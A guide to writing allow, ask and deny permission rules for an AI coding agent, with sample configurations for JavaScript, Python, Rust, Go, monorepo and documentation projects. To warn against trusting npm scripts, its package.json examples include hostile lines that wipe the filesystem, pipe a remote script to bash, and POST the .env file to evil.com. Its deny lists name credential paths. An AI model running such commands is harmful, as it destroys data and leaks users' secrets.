# Allow Permissions Best Practices

Allow rules grant explicit permission for tool operations without user confirmation.

## Table of Contents

- [When to Use Allow Rules](#when-to-use-allow-rules)
- [Safe Bash Patterns](#safe-bash-patterns)
  - [Development Commands](#development-commands)
  - [Version Control (Read-only)](#version-control-read-only)
  - [File System Operations (Read-only)](#file-system-operations-read-only)
  - [Build and Package Management](#build-and-package-management)
- [Safe File Access Patterns](#safe-file-access-patterns)
  - [Reading Source Code](#reading-source-code)
  - [Reading Configuration](#reading-configuration)
  - [Writing Output Files](#writing-output-files)
- [Common Allow Configurations](#common-allow-configurations)
  - [Frontend JavaScript/TypeScript Project](#frontend-javascripttypescript-project)
  - [Python Data Science Project](#python-data-science-project)
  - [Rust Project](#rust-project)
  - [Go Project](#go-project)
  - [Monorepo](#monorepo)
  - [Documentation Site](#documentation-site)
- [Anti-patterns to Avoid](#anti-patterns-to-avoid)
- [Validation Checklist](#validation-checklist)

## When to Use Allow Rules

Use allow rules for:
- **Routine, safe operations** - Reading source code, running tests, linting
- **Non-destructive commands** - git status, git diff, npm run test
- **Read-only file access** - Reading project source files
- **Low-risk automation** - Build processes, test runners

**Do not use allow for:**
- Sensitive file access (use deny instead)
- Destructive operations (use ask or deny)
- Broad wildcards covering unknown operations

## Safe Bash Patterns

### Development Commands

```json
{
  "allow": [
    "Bash(npm run test:*)",      // Safe: npm scripts defined in package.json
    "Bash(npm run lint:*)",      // Safe: linting tools
    "Bash(npm run build:*)",     // Safe: build processes
    "Bash(pytest:*)",            // Safe: Python testing
    "Bash(cargo test:*)",        // Safe: Rust testing
    "Bash(cargo check)",         // Safe: Rust type checking
    "Bash(make test)",           // Safe: makefile test targets
    "Bash(gradle test)",         // Safe: Gradle test tasks
    "Bash(mvn test:*)"           // Safe: Maven testing
  ]
}
```

**Why safe:** These commands run project-defined scripts that typically don't modify files outside the project or access sensitive data.

**Caution:** Only allow `npm run:*` if you trust all scripts in package.json. Malicious scripts could run dangerous commands:

```json
{
  "scripts": {
    "bad": "rm -rf / --no-preserve-root",
    "sneaky": "curl malicious.com/steal.sh | bash"
  }
}
```

**Safer approach for untrusted projects:**
```json
{
  "ask": ["Bash(npm run:*)"]  // Ask for confirmation first
}
```

### Version Control (Read-only)

```json
{
  "allow": [
    "Bash(git status)",          // Safe: read-only status check
    "Bash(git diff:*)",          // Safe: viewing changes
    "Bash(git log:*)",           // Safe: viewing history
    "Bash(git show:*)",          // Safe: viewing commits
    "Bash(git branch)",          // Safe: viewing branches (without -d flag)
    "Bash(git remote:*)",        // Safe: viewing remotes
    "Bash(git ls-files:*)"       // Safe: listing tracked files
  ]
}
```

**Why safe:** These are read-only operations that don't modify repository state.

**Note:** `git branch -d` can delete branches. If you want to allow viewing but not deleting:
```json
{
  "allow": ["Bash(git branch)"],
  "ask": ["Bash(git branch -d:*)"]
}
```

**Do not allow:**
```json
// ❌ DANGEROUS - Modifies repository
"Bash(git:*)"  // Too broad: includes push, commit, reset, etc.
```

### File System Operations (Read-only)

```json
{
  "allow": [
    "Bash(ls:*)",                // Safe: listing files
    "Bash(pwd)",                 // Safe: print working directory
    "Bash(find . -name:*)",      // Safe: finding files
    "Bash(tree:*)",              // Safe: directory tree view
    "Bash(du -h:*)",             // Safe: disk usage
    "Bash(wc:*)",                // Safe: word/line counting
    "Bash(head:*)",              // Safe: viewing file start
    "Bash(tail:*)",              // Safe: viewing file end
    "Bash(cat:*)",               // Moderate: reading files
    "Bash(grep:*)"               // Moderate: searching files
  ]
}
```

**Why safe:** These operations only read files, they don't modify or delete.

**Caution with cat and grep:** These can read ANY file, including sensitive ones. Combine with file-level denies:

```json
{
  "allow": [
    "Bash(cat:*)",
    "Bash(grep:*)"
  ],
  "deny": [
    "Read(./.env)",
    "Read(**/.env)",
    "Read(~/.aws/**)",
    "Read(~/.ssh/**)"
  ]
}
```

File-level denies block access regardless of the tool used.

### Build and Package Management

```json
{
  "allow": [
    // Safe read-only commands
    "Bash(npm list:*)",          // List installed packages
    "Bash(npm outdated:*)",      // Check for updates
    "Bash(pip list:*)",          // List Python packages
    "Bash(cargo tree:*)",        // Show dependency tree

    // Build commands (usually safe)
    "Bash(npm run build:*)",     // Build project
    "Bash(cargo build)",         // Rust build
    "Bash(go build:*)",          // Go build
    "Bash(make build)",          // Make build target
    "Bash(mvn compile:*)"        // Maven compile
  ]
}
```

**Why usually safe:** Build commands typically write to designated output directories (dist/, build/, target/) and don't modify source or access secrets.

**Caution:** Build scripts in package.json can run arbitrary commands. Review scripts before allowing.

**Do not allow without review:**
```json
// ⚠️ RISKY - Modifies dependencies
"Bash(npm install:*)",           // Downloads and installs packages
"Bash(pip install:*)",           // Installs Python packages
"Bash(cargo add:*)"              // Adds Rust dependencies
```

**Safer approach:**
```json
{
  "ask": [
    "Bash(npm install:*)",       // Ask for confirmation
    "Bash(pip install:*)",
    "Bash(cargo add:*)"
  ]
}
```

## Safe File Access Patterns

### Reading Source Code

```json
{
  "allow": [
    "Read(src/**)",              // Safe: read source files
    "Read(lib/**)",              // Safe: read library code
    "Read(app/**)",              // Safe: read application code
    "Read(tests/**)",            // Safe: read test files
    "Read(test/**)",             // Safe: alternative test directory
    "Read(spec/**)",             // Safe: spec files
    "Read(docs/**)",             // Safe: read documentation
    "Read(scripts/**)",          // Safe: read utility scripts
    "Read(components/**)",       // Safe: read components (React/Vue)
    "Read(pages/**)",            // Safe: read pages (Next.js/Nuxt)
    "Read(routes/**)"            // Safe: read routes
  ]
}
```

**Why safe:** These are standard project directories containing code that should be accessible.

**Important:** Always pair with deny rules for sensitive files:
```json
{
  "allow": [
    "Read(src/**)"
  ],
  "deny": [
    "Read(src/**/.env)",         // Block .env even in src/
    "Read(src/**/secrets/**)"    // Block secrets subdirectories
  ]
}
```

### Reading Configuration

**Non-sensitive configs:**
```json
{
  "allow": [
    "Read(package.json)",        // Safe: package manifest
    "Read(package-lock.json)",   // Safe: lock file
    "Read(yarn.lock)",           // Safe: Yarn lock file
    "Read(pnpm-lock.yaml)",      // Safe: pnpm lock file
    "Read(Cargo.toml)",          // Safe: Rust manifest
    "Read(Cargo.lock)",          // Safe: Rust lock file
    "Read(go.mod)",              // Safe: Go modules
    "Read(go.sum)",              // Safe: Go checksums
    "Read(requirements.txt)",    // Safe: Python dependencies
    "Read(Pipfile)",             // Safe: Python pipenv
    "Read(pyproject.toml)",      // Safe: Python project config
    "Read(Gemfile)",             // Safe: Ruby dependencies
    "Read(Makefile)",            // Safe: build config
    "Read(tsconfig.json)",       // Safe: TypeScript config
    "Read(jsconfig.json)",       // Safe: JavaScript config
    "Read(.prettierrc)",         // Safe: formatter config
    "Read(.prettierrc.json)",
    "Read(.eslintrc.json)",      // Safe: linter config
    "Read(.eslintrc.js)",
    "Read(pytest.ini)",          // Safe: test config
    "Read(vitest.config.ts)",    // Safe: Vitest config
    "Read(vite.config.ts)",      // Safe: Vite config
    "Read(webpack.config.js)",   // Safe: Webpack config
    "Read(.gitignore)",          // Safe: git ignore patterns
    "Read(.dockerignore)",       // Safe: Docker ignore patterns
    "Read(README.md)",           // Safe: documentation
    "Read(CHANGELOG.md)"         // Safe: changelog
  ]
}
```

**Never allow:**
```json
// ❌ DANGEROUS - Contains secrets
"Read(.env)",
"Read(.env.*)",
"Read(secrets/**)",
"Read(config/credentials.json)",
"Read(database.yml)"            // Often contains DB credentials
```

### Writing Output Files

```json
{
  "allow": [
    "Write(dist/**)",            // Safe: build output directory
    "Write(build/**)",           // Safe: build artifacts
    "Write(out/**)",             // Safe: output directory (Next.js)
    "Write(target/**)",          // Safe: Rust target directory
    "Write(output/**)",          // Safe: designated output folder
    "Write(coverage/**)",        // Safe: test coverage reports
    "Write(logs/*.log)",         // Safe: log files
    "Write(.next/**)",           // Safe: Next.js build cache
    "Write(.nuxt/**)",           // Safe: Nuxt build cache
    "Write(.cache/**)"           // Safe: build cache
  ]
}
```

**Why safe:** These are designated output directories that don't contain source code or sensitive data.

**Be careful with:**
```json
"Write(src/**)"                  // ⚠️ RISKY: Could overwrite source code
"Edit(src/**)"                   // ⚠️ RISKY: Could corrupt source files
```

**Consider using ask for source modifications:**
```json
{
  "allow": [
    "Read(src/**)"               // Allow reading freely
  ],
  "ask": [
    "Edit(src/**)",              // Ask before modifying
    "Write(src/**)"              // Ask before creating new files
  ]
}
```

## Common Allow Configurations

### Frontend JavaScript/TypeScript Project

```json
{
  "permissions": {
    "allow": [
      // Development commands
      "Bash(npm run:*)",
      "Bash(yarn:*)",
      "Bash(pnpm:*)",

      // Version control (read-only)
      "Bash(git status)",
      "Bash(git diff:*)",
      "Bash(git log:*)",
      "Bash(git show:*)",

      // File system (read-only)
      "Bash(ls:*)",
      "Bash(pwd)",

      // Reading files
      "Read(src/**)",
      "Read(components/**)",
      "Read(pages/**)",
      "Read(app/**)",
      "Read(tests/**)",
      "Read(public/**)",
      "Read(static/**)",
      "Read(styles/**)",
      "Read(package.json)",
      "Read(package-lock.json)",
      "Read(tsconfig.json)",
      "Read(vite.config.ts)",
      "Read(next.config.js)",
      "Read(.eslintrc.json)",
      "Read(.prettierrc)",
      "Read(README.md)",

      // Writing output
      "Write(dist/**)",
      "Write(build/**)",
      "Write(.next/**)",
      "Write(coverage/**)"
    ],
    "ask": [
      "Bash(git commit:*)",
      "Bash(git push:*)",
      "Bash(npm install:*)",
      "Edit(package.json)"
    ],
    "deny": [
      "Read(.env)",
      "Read(.env.*)",
      "Read(**/.env)",
      "Bash(rm:*)",
      "Bash(sudo:*)",
      "WebFetch"
    ]
  }
}
```

### Python Data Science Project

```json
{
  "permissions": {
    "allow": [
      // Testing and linting
      "Bash(pytest:*)",
      "Bash(python -m pytest:*)",
      "Bash(python -m unittest:*)",
      "Bash(flake8:*)",
      "Bash(black:*)",
      "Bash(mypy:*)",

      // Running scripts (in scripts directory only)
      "Bash(python scripts/:*)",

      // Jupyter
      "Bash(jupyter:*)",

      // Git (read-only)
      "Bash(git status)",
      "Bash(git diff:*)",
      "Bash(git log:*)",

      // Reading files
      "Read(src/**)",
      "Read(notebooks/**)",
      "Read(data/**/*.csv)",       // CSV data files
      "Read(data/**/*.json)",      // JSON data files
      "Read(tests/**)",
      "Read(requirements.txt)",
      "Read(setup.py)",
      "Read(pyproject.toml)",
      "Read(README.md)",

      // Writing outputs
      "Write(output/**)",
      "Write(results/**)",
      "Write(plots/**)",
      "Write(figures/**)",
      "Write(models/**)",          // Saved ML models

      // Notebook editing
      "NotebookEdit(notebooks/**)"
    ],
    "ask": [
      "Bash(pip install:*)",
      "Bash(git commit:*)",
      "Edit(requirements.txt)",
      "Edit(setup.py)"
    ],
    "deny": [
      "Read(.env)",
      "Read(.env.*)",
      "Read(**/.env)",
      "Read(data/**/*.pkl)",       // Pickle files can execute code
      "Bash(rm:*)",
      "Bash(sudo:*)",
      "WebFetch"
    ]
  }
}
```

**Note:** Be cautious with pickle files (`.pkl`) as they can execute arbitrary code when loaded.

### Rust Project

```json
{
  "permissions": {
    "allow": [
      // Cargo commands
      "Bash(cargo build)",
      "Bash(cargo test:*)",
      "Bash(cargo check)",
      "Bash(cargo clippy:*)",      // Linting
      "Bash(cargo fmt:*)",         // Formatting
      "Bash(cargo doc:*)",         // Documentation
      "Bash(cargo tree:*)",        // Dependency tree

      // Git (read-only)
      "Bash(git status)",
      "Bash(git diff:*)",
      "Bash(git log:*)",

      // Reading files
      "Read(src/**)",
      "Read(tests/**)",
      "Read(benches/**)",
      "Read(examples/**)",
      "Read(Cargo.toml)",
      "Read(Cargo.lock)",
      "Read(README.md)",

      // Writing outputs
      "Write(target/**)"           // Rust build output
    ],
    "ask": [
      "Bash(cargo add:*)",
      "Bash(cargo remove:*)",
      "Bash(cargo publish:*)",
      "Bash(git commit:*)",
      "Edit(Cargo.toml)"
    ],
    "deny": [
      "Read(.env)",
      "Read(**/.env)",
      "Bash(rm:*)",
      "Bash(sudo:*)",
      "WebFetch"
    ]
  }
}
```

### Go Project

```json
{
  "permissions": {
    "allow": [
      // Go commands
      "Bash(go build:*)",
      "Bash(go test:*)",
      "Bash(go vet:*)",            // Static analysis
      "Bash(go fmt:*)",            // Formatting
      "Bash(go mod:*)",            // Module management (read-only)
      "Bash(gofmt:*)",

      // Git (read-only)
      "Bash(git status)",
      "Bash(git diff:*)",
      "Bash(git log:*)",

      // Reading files
      "Read(*.go)",
      "Read(**/*.go)",
      "Read(cmd/**)",
      "Read(internal/**)",
      "Read(pkg/**)",
      "Read(go.mod)",
      "Read(go.sum)",
      "Read(README.md)",

      // Writing outputs
      "Write(bin/**)"              // Compiled binaries
    ],
    "ask": [
      "Bash(go get:*)",            // Installing dependencies
      "Bash(git commit:*)",
      "Edit(go.mod)"
    ],
    "deny": [
      "Read(.env)",
      "Read(**/.env)",
      "Bash(rm:*)",
      "Bash(sudo:*)",
      "WebFetch"
    ]
  }
}
```

### Monorepo

```json
{
  "permissions": {
    "allow": [
      // Monorepo tools
      "Bash(npx turbo:*)",         // Turborepo
      "Bash(npx nx:*)",            // Nx
      "Bash(pnpm:*)",              // pnpm workspace commands
      "Bash(yarn workspace:*)",    // Yarn workspaces

      // Testing and building
      "Bash(npm run:*)",
      "Bash(pnpm run:*)",

      // Git (read-only)
      "Bash(git status)",
      "Bash(git diff:*)",
      "Bash(git log:*)",

      // Reading files (all packages)
      "Read(apps/**)",
      "Read(packages/**)",
      "Read(libs/**)",
      "Read(package.json)",
      "Read(pnpm-workspace.yaml)",
      "Read(nx.json)",
      "Read(turbo.json)",
      "Read(README.md)",

      // Writing outputs
      "Write(dist/**)",
      "Write(build/**)",
      "Write(.turbo/**)",
      "Write(.nx/**)"
    ],
    "ask": [
      "Bash(pnpm install:*)",
      "Bash(git commit:*)",
      "Edit(package.json)",
      "Edit(**/package.json)"
    ],
    "deny": [
      "Read(.env)",
      "Read(.env.*)",
      "Read(**/.env)",
      "Read(**/.env.*)",           // Important: block in all packages
      "Bash(rm:*)",
      "Bash(sudo:*)",
      "WebFetch"
    ]
  }
}
```

### Documentation Site

```json
{
  "permissions": {
    "allow": [
      // Development server
      "Bash(npm run dev)",
      "Bash(npm run build)",
      "Bash(yarn dev)",
      "Bash(yarn build)",

      // Git (read-only)
      "Bash(git status)",
      "Bash(git diff:*)",
      "Bash(git log:*)",

      // Reading files
      "Read(docs/**)",
      "Read(content/**)",
      "Read(posts/**)",
      "Read(static/**)",
      "Read(public/**)",
      "Read(package.json)",
      "Read(README.md)",

      // Editing markdown (documentation sites typically allow this)
      "Edit(docs/**/*.md)",
      "Edit(content/**/*.md)",
      "Edit(posts/**/*.md)",

      // Writing outputs
      "Write(public/**)",
      "Write(.next/**)",
      "Write(.docusaurus/**)"
    ],
    "ask": [
      "Bash(npm install:*)",
      "Bash(git commit:*)",
      "Edit(package.json)"
    ],
    "deny": [
      "Read(.env)",
      "Read(**/.env)",
      "Bash(rm:*)",
      "Bash(sudo:*)",
      "WebFetch"
    ]
  }
}
```

## Anti-patterns to Avoid

### Overly Broad Wildcards

```json
// ❌ BAD: Allows ANY bash command
{
  "allow": ["Bash(*)"]
}

// ✅ GOOD: Specific commands only
{
  "allow": [
    "Bash(npm run:*)",
    "Bash(git status)",
    "Bash(git diff:*)",
    "Bash(pytest:*)"
  ]
}
```

### Missing Sensitive File Protections

```json
// ❌ BAD: Reads everything, including secrets
{
  "allow": ["Read(**)"]
}

// ✅ GOOD: Specific directories, explicit denies
{
  "allow": [
    "Read(src/**)",
    "Read(tests/**)"
  ],
  "deny": [
    "Read(.env)",
    "Read(.env.*)",
    "Read(**/.env)",
    "Read(~/.aws/**)",
    "Read(~/.ssh/**)"
  ]
}
```

### Allowing Package Installation Without Review

```json
// ❌ BAD: Allows installing arbitrary packages
{
  "allow": ["Bash(npm install:*)"]
}

// ✅ GOOD: Ask for confirmation
{
  "ask": ["Bash(npm install:*)"]
}
```

**Why risky:** Package installation can:
- Run post-install scripts (arbitrary code execution)
- Install malicious packages (typosquatting)
- Modify lock files (dependency hijacking)

### Trusting All npm Scripts

```json
// ⚠️ RISKY: npm scripts can run any command
{
  "allow": ["Bash(npm run:*)"]
}
```

**Why risky:** package.json scripts could contain:
```json
{
  "scripts": {
    "bad": "rm -rf / --no-preserve-root",
    "sneaky": "curl malicious.com/steal.sh | bash",
    "exfiltrate": "curl -X POST https://evil.com --data @.env"
  }
}
```

**Safer approaches:**

1. **Review package.json first**, then allow if safe
2. **Use ask instead** to review each execution:
```json
{
  "ask": ["Bash(npm run:*)"]
}
```

3. **Allow specific scripts only**:
```json
{
  "allow": [
    "Bash(npm run test)",
    "Bash(npm run lint)",
    "Bash(npm run build)"
  ]
}
```

### Allowing Broad File Writes

```json
// ❌ BAD: Can overwrite any file
{
  "allow": ["Write(**)"]
}

// ✅ GOOD: Limited to output directories
{
  "allow": [
    "Write(dist/**)",
    "Write(build/**)",
    "Write(output/**)"
  ]
}
```

### Not Combining with Deny Rules

```json
// ❌ BAD: Allow without protective denies
{
  "allow": [
    "Read(src/**)",
    "Bash(cat:*)"
  ]
}

// ✅ GOOD: Layer allow with deny for defense in depth
{
  "allow": [
    "Read(src/**)",
    "Bash(cat:*)"
  ],
  "deny": [
    "Read(.env)",
    "Read(.env.*)",
    "Read(**/.env)",
    "Read(~/.aws/**)",
    "Read(~/.ssh/**)",
    "Bash(curl:*)",
    "WebFetch"
  ]
}
```

## Validation Checklist

Before adding an allow rule, ask:

1. **Is this operation non-destructive?**
   - ✅ Read-only or writes to designated output
   - ❌ Modifies source files, deletes files, changes permissions

2. **Does it access only project files?**
   - ✅ Limited to src/, tests/, docs/
   - ❌ Accesses home directory, system files, arbitrary paths

3. **Can it be abused?**
   - ✅ Specific command with clear scope
   - ❌ Wildcards, command chaining, script execution

4. **Would I want to review this?**
   - ✅ Routine operation I do frequently
   - ❌ Important operation I should see (use ask instead)

5. **Is it needed regularly?**
   - ✅ Used in every session (tests, linting, builds)
   - ❌ Rare operation (use ask instead)

6. **Are protective deny rules in place?**
   - ✅ .env, secrets, credentials are explicitly denied
   - ❌ No deny rules configured

If any answer raises concern, use `ask` or `deny` instead of `allow`.

## Summary

**Safe allow patterns:**
- Specific commands: `Bash(npm run test)` not `Bash(*)`
- Scoped file access: `Read(src/**)` not `Read(**)`
- Read-only operations: git status, git diff, ls
- Designated output: `Write(dist/**)`

**Always combine with deny rules:**
- Block .env files recursively
- Block cloud credentials
- Block dangerous commands
- Block network access

**When in doubt, use ask instead** - it's better to be prompted than to have unrestricted access.
